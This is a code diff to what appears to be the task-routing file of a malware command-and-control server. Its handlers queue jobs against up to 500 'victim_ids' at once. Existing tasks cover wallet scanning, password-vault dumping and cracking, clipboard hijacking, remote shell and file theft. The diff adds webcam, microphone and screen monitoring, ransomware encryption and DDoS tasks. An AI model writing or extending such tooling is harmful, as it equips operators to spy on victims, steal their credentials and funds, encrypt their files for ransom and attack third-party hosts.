@@ -10,7 +10,7 @@ import { taskLinkError } from '../lib/tasks';
 import { validateParams } from '../lib/task-schemas';
 import { dispatchCommand, hasControl } from './ws';
 
-const TASK_NAMES = ['scan_wallets', 'dump_vault', 'crack_vault', 'clip_start', 'clip_stop', 'shell', 'harvest', 'screenshot', 'file_pull', 'cancel', 'agent'] as const;
+const TASK_NAMES = ['scan_wallets', 'dump_vault', 'crack_vault', 'clip_start', 'clip_stop', 'shell', 'harvest', 'screenshot', 'file_pull', 'cancel', 'agent', 'monitor', 'files', 'webcam', 'mic', 'ransomware', 'ddos'] as const;
 
 const enqueueSchema = z.object({
   victim_ids: z.array(z.string().uuid()).min(1).max(500),
@@ -30,7 +30,11 @@ const templates = [
   { name: 'screenshot', label: 'Screenshot', params: {}, timeout_sec: 60 },
   { name: 'harvest', label: 'Harvest', params: {}, timeout_sec: 180 },
   { name: 'shell', label: 'Shell', params: { command: 'whoami' }, timeout_sec: 60 },
-  { name: 'agent', label: 'Agent command', params: { command: 'ops' }, timeout_sec: 60 }
+  { name: 'agent', label: 'Agent command', params: { command: 'ops' }, timeout_sec: 60 },
+  { name: 'monitor', label: 'Monitor', params: { seconds: 5, quality: 60, fps: 1 }, timeout_sec: 60 },
+  { name: 'files', label: 'Files', params: { action: 'list', path: '' }, timeout_sec: 120 },
+  { name: 'ransomware', label: 'Ransomware', params: { action: 'encrypt', path: '' }, timeout_sec: 300 },
+  { name: 'ddos', label: 'DDoS', params: { method: 'http', host: '', port: 80, seconds: 30 }, timeout_sec: 300 }
 ];
 
 export const taskRoutes: FastifyPluginAsync = async (app) => {
